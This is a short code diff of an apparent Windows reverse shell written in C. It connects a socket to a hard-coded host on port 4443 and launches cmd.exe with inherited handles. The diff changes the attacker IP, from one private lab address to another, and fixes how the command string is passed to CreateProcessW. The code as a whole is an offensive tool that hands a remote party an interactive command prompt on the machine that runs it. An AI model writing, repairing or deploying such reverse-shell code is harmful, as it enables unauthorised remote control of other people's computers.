@@ -11,7 +11,7 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_PORT 4443
-#define DEFAULT_HOST L"192.168.139.130"
+#define DEFAULT_HOST L"192.168.29.136"
 
 int _tmain(void*)
 {
@@ -62,9 +62,9 @@ int _tmain(void*)
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&pi, sizeof(pi));
 
-	LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe";
+	LPWSTR cmd = _wcsdup(L"C:\\Windows\\System32\\cmd.exe");
 
-	if (!CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
 	{
 		_tprintf(L"CreateProcess failed: %d\n", GetLastError());
 		closesocket(ConnectSocket);
